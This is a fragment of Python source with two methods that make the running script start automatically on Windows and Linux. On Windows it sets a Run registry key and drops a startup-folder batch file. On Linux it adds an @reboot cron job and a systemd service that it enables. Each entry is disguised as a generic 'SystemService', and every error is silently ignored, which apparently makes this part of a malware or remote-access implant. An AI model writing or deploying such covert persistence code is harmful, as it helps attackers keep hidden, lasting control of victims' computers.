    def _windows_persistence(self):
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"

            script_path = os.path.abspath(sys.argv[0])
            python_path = sys.executable

            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as registry_key:
                winreg.SetValueEx(registry_key, "SystemService", 0, winreg.REG_SZ, 
                                f'"{python_path}" "{script_path}"')

            self.persistence_methods.append("registry")
        except:
            pass

        try:
            startup_folder = os.path.join(os.getenv('APPDATA'), 
                                        r'Microsoft\Windows\Start Menu\Programs\Startup')
            script_path = os.path.abspath(sys.argv[0])
            shortcut_path = os.path.join(startup_folder, "SystemService.bat")

            with open(shortcut_path, 'w') as f:
                f.write(f'@echo off\nstart /min "" "{sys.executable}" "{script_path}"')

            self.persistence_methods.append("startup_folder")
        except:
            pass

    def _linux_persistence(self):
        try:
            cron_job = f"@reboot {sys.executable} {os.path.abspath(sys.argv[0])}\n"
            with open("/etc/cron.d/system_service", "w") as f:
                f.write(cron_job)
            self.persistence_methods.append("cron")
        except:
            pass

        try:
            service_content = f"""[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {os.path.abspath(sys.argv[0])}
Restart=always

[Install]
WantedBy=multi-user.target
"""
            with open("/etc/systemd/system/system-service.service", "w") as f:
                f.write(service_content)

            subprocess.run(["systemctl", "enable", "system-service"], 
                         capture_output=True)
            self.persistence_methods.append("systemd")
        except:
            pass

